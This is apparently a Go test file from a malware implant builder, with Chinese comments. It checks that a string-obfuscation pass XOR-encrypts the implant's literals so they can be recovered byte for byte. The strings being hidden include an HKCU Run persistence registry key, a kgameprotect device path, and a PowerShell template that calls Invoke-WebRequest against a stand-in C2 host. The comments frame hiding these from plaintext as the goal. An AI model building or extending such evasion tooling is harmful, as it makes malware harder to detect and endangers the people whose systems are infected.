package builder

import (
	"bytes"
	"strings"
	"testing"
)

// ─── 模板字符串混淆：双引号/转义/反引号三类都要覆盖，且值必须逐字节还原 ──────
//
// v1.4.0 S3 补的盲区：旧实现只混淆"简单双引号字面量"，于是
//   - 含转义的双引号字面量（Windows 路径、设备名，如 "\\\\.\\kgameprotect"）被跳过；
//   - 全部反引号原始字符串被跳过（理由是 struct tag 不能改，但注册表键/脚本一并放行）。
// 实测默认载荷里 `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 是明文。
// 这些用例把"该混淆的要混淆、不能碰的绝不能碰"钉住。

// deobfuscate 用与服务端相同的密钥流还原 xd("...") 里的密文（供断言使用）。
func deobfuscate(hexStr string, xdBase byte) string {
	out := make([]byte, 0, len(hexStr)/2)
	for i := 0; i+1 < len(hexStr); i += 2 {
		b := hexByte(hexStr[i])<<4 | hexByte(hexStr[i+1])
		out = append(out, b^xorObfuscateKey(i/2, xdBase))
	}
	return string(out)
}

func hexByte(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	}
	return 0
}

// mustDecodeXd 取出源码里第一处 xd("...") 的参数并还原成明文。
func mustDecodeXd(t *testing.T, src string, xdBase byte) string {
	t.Helper()
	i := strings.Index(src, `xd("`)
	if i < 0 {
		t.Fatalf("源码里没有 xd(\"...\")：%s", src)
	}
	rest := src[i+len(`xd("`):]
	j := strings.Index(rest, `"`)
	if j < 0 {
		t.Fatalf("xd(\"...\") 没有闭合引号")
	}
	return deobfuscate(rest[:j], xdBase)
}

const testXdBase = 0x5A

// TestObfuscateEscapedLiteral 含转义的双引号字面量必须被混淆，且还原后与运行期真实值一致。
//
// 注意测试里的两层转义：这里是**用原始字符串写出"将被混淆的 Go 源码文本"**，
// 所以源码文本是 `"\\\\.\\kgameprotect"`，它的运行期真实值是 `\\.\kgameprotect`。
func TestObfuscateEscapedLiteral(t *testing.T) {
	src := []byte(`package main

func f() string {
	return "\\\\.\\kgameprotect"
}
`)
	out := string(obfuscateImplantSource(src, testXdBase))

	if strings.Contains(out, "kgameprotect") {
		t.Fatalf("转义字面量的明文仍留在源码里：%s", out)
	}
	if got := mustDecodeXd(t, out, testXdBase); got != `\\.\kgameprotect` {
		t.Fatalf("还原值 = %q, want %q", got, `\\.\kgameprotect`)
	}
}

// TestObfuscateRawRegistryPath 反引号写的注册表键必须被混淆（旧实现整类放行）。
func TestObfuscateRawRegistryPath(t *testing.T) {
	const key = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	src := []byte("package main\n\nvar k = `" + key + "`\n")
	out := string(obfuscateImplantSource(src, testXdBase))

	if strings.Contains(out, "CurrentVersion") {
		t.Fatalf("反引号注册表键的明文仍在：%s", out)
	}
	if got := mustDecodeXd(t, out, testXdBase); got != key {
		t.Fatalf("还原值 = %q, want %q", got, key)
	}
}

// TestObfuscateRawMultilineScript 多行原始字符串（脚本模板）也要混淆，且值逐字节还原。
func TestObfuscateRawMultilineScript(t *testing.T) {
	script := "Add-Type -TypeDefinition \"...\"\r\nInvoke-WebRequest http://c2.example/x\r\n"
	src := []byte("package main\n\nvar s = `" + script + "`\n")
	out := string(obfuscateImplantSource(src, testXdBase))

	if strings.Contains(out, "Invoke-WebRequest") {
		t.Fatalf("脚本明文仍在：%s", out)
	}
	if got := mustDecodeXd(t, out, testXdBase); got != script {
		t.Fatalf("还原值不一致：%q", got)
	}
}

// TestKeepStructTagRawString struct tag 必须原样保留（改了 encoding/json 就废）。
func TestKeepStructTagRawString(t *testing.T) {
	src := []byte("package main\n\ntype T struct {\n\tName string `json:\"name,omitempty\" xml:\"name\"`\n}\n")
	out := string(obfuscateImplantSource(src, testXdBase))
	if !strings.Contains(out, "`json:\"name,omitempty\" xml:\"name\"`") {
		t.Fatalf("struct tag 被改动了：%s", out)
	}
	if strings.Contains(out, "xd(") {
		t.Fatalf("struct tag 不该被混淆：%s", out)
	}
}

// TestKeepRawStringInConst const 行里的原始字符串不能改成 xd()（常量要求编译期常量，会编译失败）。
func TestKeepRawStringInConst(t *testing.T) {
	src := []byte("package main\n\nconst dev = `\\\\.\\kgameprotect`\n")
	out := string(obfuscateImplantSource(src, testXdBase))
	if !strings.Contains(out, "`\\\\.\\kgameprotect`") {
		t.Fatalf("const 行里的原始字符串被改动了（会编译失败）：%s", out)
	}
}

// TestKeepCommentsAndShortLiterals 注释与 <4 字节的字面量保持原样（与旧口径一致）。
func TestKeepCommentsAndShortLiterals(t *testing.T) {
	src := []byte("package main\n\n// RUN 关键字说明：CurrentVersion\\Run\nvar a = \"ab\"\n/* block: SOFTWARE\\Microsoft */\n")
	out := string(obfuscateImplantSource(src, testXdBase))
	for _, want := range []string{"CurrentVersion\\Run", `"ab"`, "SOFTWARE\\Microsoft"} {
		if !strings.Contains(out, want) {
			t.Fatalf("不该改动的内容 %q 被改了：%s", want, out)
		}
	}
}

// TestNoDoubleObfuscation 已经混淆过的字面量不得二次加密（幂等）。
func TestNoDoubleObfuscation(t *testing.T) {
	src := []byte("package main\n\nvar k = `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n")
	once := obfuscateImplantSource(src, testXdBase)
	twice := obfuscateImplantSource(once, testXdBase)
	if !bytes.Equal(once, twice) {
		t.Fatalf("二次混淆改变了输出（应幂等）：\n一次=%s\n二次=%s", once, twice)
	}
}

// TestRawStringObfuscatableGuards 直接钉住判定的边界（tag 与 const 之外的都放行）。
func TestRawStringObfuscatableGuards(t *testing.T) {
	cases := []struct {
		name    string
		content string
		src     string
		want    bool
	}{
		{"注册表键", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "var k = `x`", true},
		{"设备路径", `\\.\kgameprotect`, "var k = `x`", true},
		{"struct tag", `json:"a"`, "var k = `x`", false},
		{"太短", "abc", "var k = `x`", false},
		{"const 行", `HKCU\Software\CurrentVersion`, "const k = `x`", false},
	}
	for _, c := range cases {
		at := strings.Index(c.src, "`")
		if got := rawStringObfuscatable(c.content, []byte(c.src), at); got != c.want {
			t.Errorf("%s: rawStringObfuscatable = %v, want %v", c.name, got, c.want)
		}
	}
}
